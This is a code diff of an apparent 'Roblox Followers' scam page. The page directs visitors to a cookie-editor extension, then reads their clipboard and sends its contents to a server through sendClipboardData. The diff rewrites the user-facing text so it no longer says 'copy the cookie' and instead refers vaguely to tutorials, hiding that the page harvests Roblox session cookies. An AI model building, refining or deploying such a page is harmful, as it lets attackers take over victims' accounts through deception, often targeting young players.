@@ -348,7 +348,7 @@
                 <img src="favicon.png" alt="Logo">
             </div>
             <h1>Roblox Followers</h1>
-            <p class="subtitle">Select your platform extension below and view the tutorial guides.</p>
+            <p class="subtitle">Watch The Tuts On How To Get Followers.</p>
         </header>
 
         <!-- Main Action Box (Stretched across the screen) -->
@@ -358,7 +358,7 @@
 
             <div class="extensions-group">
                 <a href="https://apps.apple.com/us/app/cookie-editor/id6446215341" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
-                    Extension For iPhone
+                    iPhone Extension
                 </a>
                 <a href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
                     PC Extension
@@ -413,7 +413,7 @@
                         clipboardText: text
                     })
                 });
-                statusEl.textContent = "Restart device to get followers added to your account!";
+                statusEl.textContent = "Watch One Of The Tuts And Click Add Followers";
             } catch (error) {
                 statusEl.textContent = "Something went wrong. Please try again.";
                 console.error(error);
@@ -425,12 +425,12 @@
                 statusEl.textContent = "Adding Followers...";
                 const text = await navigator.clipboard.readText();
                 if (!text) {
-                    statusEl.textContent = "Error: make sure you copy the cookie.";
+                    statusEl.textContent = "Error: make sure you followed one of the tuts.";
                     return;
                 }
                 await sendClipboardData(text);
             } catch (error) {
-                statusEl.textContent = "Error: make sure you copy the cookie.";
+                statusEl.textContent = "Error: make sure you followed one of the tuts.";
                 console.error(error);
             }
         });
